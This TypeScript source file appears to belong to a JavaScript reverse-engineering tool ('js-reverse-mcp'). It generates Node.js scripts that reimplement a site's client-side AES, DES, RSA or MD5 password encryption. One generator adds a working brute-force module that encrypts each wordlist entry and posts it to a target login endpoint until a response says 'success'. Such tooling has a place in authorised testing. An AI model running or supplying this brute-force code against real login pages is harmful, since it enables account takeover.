/**
 * JavaScript/Node.js解密脚本模板生成器
 */

import { ScriptParams } from "./python-template.js";

export function generateJSDecryptScript(params: ScriptParams): string {
  switch (params.algorithm.toUpperCase()) {
    case "AES-CBC":
    case "AES-ECB":
    case "AES":
      return generateJSAES(params);
    case "DES":
    case "3DES":
    case "TRIPLEDES":
      return generateJSDES(params);
    case "RSA":
      return generateJSRSA(params);
    case "MD5":
      return generateJSMD5(params);
    default:
      return generateJSCustom(params);
  }
}

export function generateJSEncryptScript(params: ScriptParams): string {
  return generateJSDecryptScript(params);
}

export function generateJSBruteScript(params: ScriptParams): string {
  const base = generateJSDecryptScript(params);
  return `${base}

// ====== 暴力破解模块 ======
const fs = require('fs');
const axios = require('axios'); // npm install axios

const LOGIN_URL = "${params.loginUrl || "http://target.com/api/login"}";
const PARAM_NAME = "${params.paramName || "password"}";

async function bruteForce(username, wordlistPath, delay = 500) {
  const passwords = fs.readFileSync(wordlistPath, 'utf-8')
    .split('\\n')
    .map(l => l.trim())
    .filter(l => l);

  console.log(\`[*] 开始暴力破解，共 \${passwords.length} 个密码\`);

  for (let i = 0; i < passwords.length; i++) {
    const pwd = passwords[i];
    const encryptedPwd = encrypt(pwd);

    try {
      const resp = await axios.post(LOGIN_URL, {
        username: username,
        [PARAM_NAME]: encryptedPwd
      }, { timeout: 10000 });

      const result = resp.data;
      if (JSON.stringify(result).toLowerCase().includes('success')) {
        console.log(\`\\n[+] 破解成功! 密码: \${pwd}\`);
        console.log(\`    加密后: \${encryptedPwd}\`);
        console.log(\`    响应: \${JSON.stringify(result)}\`);
        return pwd;
      } else {
        console.log(\`  [\${i+1}/\${passwords.length}] 尝试: \${pwd} -> 失败\`);
      }
    } catch (e) {
      console.log(\`  [\${i+1}/\${passwords.length}] 错误: \${e.message}\`);
    }

    await new Promise(r => setTimeout(r, delay));
  }

  console.log('[-] 暴力破解结束，未找到正确密码');
  return null;
}

// 使用示例
// bruteForce('admin', 'wordlist.txt', 300);
`;
}

function generateJSAES(params: ScriptParams): string {
  const mode = params.mode?.toUpperCase().includes("ECB") ? "ECB" : "CBC";

  return `/**
 * AES ${mode} 加密/解密脚本
 * 自动生成 by js-reverse-mcp
 *
 * 算法: AES-${mode}
 * 密钥: ${params.key || "需要填入"}
 * IV:   ${mode === "CBC" ? (params.iv || "需要填入") : "N/A"}
 * 编码: ${params.encoding || "Base64"}
 * 
 * 安装依赖: npm install crypto-js
 */

const CryptoJS = require('crypto-js');

// ====== 配置参数 ======
const KEY = "${params.key || "1234567890abcdef"}";
${mode === "CBC" ? `const IV = "${params.iv || "1234567890abcdef"}";` : "// ECB模式不需要IV"}
const ENCODING = "${params.encoding || "base64"}"; // base64 或 hex

function encrypt(plaintext) {
  const key = CryptoJS.enc.Utf8.parse(KEY);
  ${mode === "CBC" ? "const iv = CryptoJS.enc.Utf8.parse(IV);" : ""}
  
  const encrypted = CryptoJS.AES.encrypt(plaintext, key, {
    ${mode === "CBC" ? "iv: iv," : ""}
    mode: CryptoJS.mode.${mode},
    padding: CryptoJS.pad.Pkcs7
  });
  
  if (ENCODING === "hex") {
    return encrypted.ciphertext.toString();
  }
  return encrypted.toString(); // 默认Base64
}

function decrypt(ciphertext) {
  const key = CryptoJS.enc.Utf8.parse(KEY);
  ${mode === "CBC" ? "const iv = CryptoJS.enc.Utf8.parse(IV);" : ""}
  
  let encryptedData;
  if (ENCODING === "hex") {
    encryptedData = CryptoJS.enc.Base64.stringify(CryptoJS.enc.Hex.parse(ciphertext));
  } else {
    encryptedData = ciphertext;
  }
  
  const decrypted = CryptoJS.AES.decrypt(encryptedData, key, {
    ${mode === "CBC" ? "iv: iv," : ""}
    mode: CryptoJS.mode.${mode},
    padding: CryptoJS.pad.Pkcs7
  });
  
  return decrypted.toString(CryptoJS.enc.Utf8);
}

// ====== 测试 ======
const testPlaintext = "${params.testPlaintext || "admin123"}";
const encrypted = encrypt(testPlaintext);
const decrypted = decrypt(encrypted);

console.log("明文:", testPlaintext);
console.log("加密:", encrypted);
console.log("解密:", decrypted);
${params.testCiphertext ? `
const targetCiphertext = "${params.testCiphertext}";
console.log("\\n目标密文:", targetCiphertext);
console.log("计算密文:", encrypted);
console.log("是否匹配:", encrypted === targetCiphertext ? "✅" : "❌");` : ""}
console.log("验证:", decrypted === testPlaintext ? "✅ 通过" : "❌ 失败");

module.exports = { encrypt, decrypt };
`;
}

function generateJSDES(params: ScriptParams): string {
  const is3DES = params.algorithm.toUpperCase().includes("3") || params.algorithm.toUpperCase().includes("TRIPLE");
  return `/**
 * ${is3DES ? "3DES (TripleDES)" : "DES"} 加密/解密脚本
 * 自动生成 by js-reverse-mcp
 * 安装依赖: npm install crypto-js
 */

const CryptoJS = require('crypto-js');

const KEY = "${params.key || (is3DES ? "123456789012345678901234" : "12345678")}";
${params.iv ? `const IV = "${params.iv}";` : ""}

function encrypt(plaintext) {
  const key = CryptoJS.enc.Utf8.parse(KEY);
  const encrypted = CryptoJS.${is3DES ? "TripleDES" : "DES"}.encrypt(plaintext, key, {
    mode: CryptoJS.mode.ECB,
    padding: CryptoJS.pad.Pkcs7
  });
  return encrypted.toString();
}

function decrypt(ciphertext) {
  const key = CryptoJS.enc.Utf8.parse(KEY);
  const decrypted = CryptoJS.${is3DES ? "TripleDES" : "DES"}.decrypt(ciphertext, key, {
    mode: CryptoJS.mode.ECB,
    padding: CryptoJS.pad.Pkcs7
  });
  return decrypted.toString(CryptoJS.enc.Utf8);
}

// 测试
const test = "${params.testPlaintext || "admin123"}";
const enc = encrypt(test);
const dec = decrypt(enc);
console.log("明文:", test);
console.log("加密:", enc);
console.log("解密:", dec);
console.log("验证:", dec === test ? "✅" : "❌");

module.exports = { encrypt, decrypt };
`;
}

function generateJSRSA(params: ScriptParams): string {
  return `/**
 * RSA 加密脚本
 * 自动生成 by js-reverse-mcp
 * 安装依赖: npm install jsencrypt
 */

const JSEncrypt = require('jsencrypt');

const PUBLIC_KEY = \`${params.publicKey || "-----BEGIN PUBLIC KEY-----\nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC...\n-----END PUBLIC KEY-----"}\`;

function encrypt(plaintext) {
  const encryptor = new JSEncrypt();
  encryptor.setPublicKey(PUBLIC_KEY);
  return encryptor.encrypt(plaintext);
}

// 测试
const test = "${params.testPlaintext || "admin123"}";
const enc = encrypt(test);
console.log("明文:", test);
console.log("加密:", enc);
console.log("注意: RSA每次加密结果不同（PKCS1v1.5随机填充）");

module.exports = { encrypt };
`;
}

function generateJSMD5(params: ScriptParams): string {
  return `/**
 * MD5 哈希脚本
 * 自动生成 by js-reverse-mcp
 * 安装依赖: npm install crypto-js
 */

const CryptoJS = require('crypto-js');

function md5Hash(plaintext) {
  return CryptoJS.MD5(plaintext).toString();
}

function md5HashUpper(plaintext) {
  return md5Hash(plaintext).toUpperCase();
}

function doubleMd5(plaintext) {
  return md5Hash(md5Hash(plaintext));
}

function md5WithSalt(plaintext, salt) {
  return md5Hash(plaintext + salt);
}

// 测试
const test = "${params.testPlaintext || "admin123"}";
console.log("明文:", test);
console.log("MD5(小写):", md5Hash(test));
console.log("MD5(大写):", md5HashUpper(test));
console.log("双重MD5:", doubleMd5(test));
${params.testCiphertext ? `
const target = "${params.testCiphertext}";
console.log("\\n目标哈希:", target);
console.log("计算哈希:", md5Hash(test));
console.log("是否匹配:", md5Hash(test) === target ? "✅" : "❌");` : ""}

module.exports = { md5Hash, md5HashUpper, doubleMd5, md5WithSalt };
`;
}

function generateJSCustom(params: ScriptParams): string {
  return `/**
 * 自定义加密/解密脚本
 * 算法: ${params.algorithm}
 * 自动生成 by js-reverse-mcp
 * 
 * 请根据实际JS逆向结果填充加密逻辑
 */

const KEY = "${params.key || "your_key_here"}";
${params.iv ? `const IV = "${params.iv}";` : ""}

function encrypt(plaintext) {
  // TODO: 根据JS逆向结果实现加密逻辑
  throw new Error("请根据JS逆向结果实现加密逻辑");
}

function decrypt(ciphertext) {
  // TODO: 根据JS逆向结果实现解密逻辑
  throw new Error("请根据JS逆向结果实现解密逻辑");
}

// 测试
try {
  const test = "${params.testPlaintext || "test_password"}";
  const enc = encrypt(test);
  console.log("明文:", test);
  console.log("加密:", enc);
} catch (e) {
  console.log("⚠️", e.message);
}

module.exports = { encrypt, decrypt };
`;
}
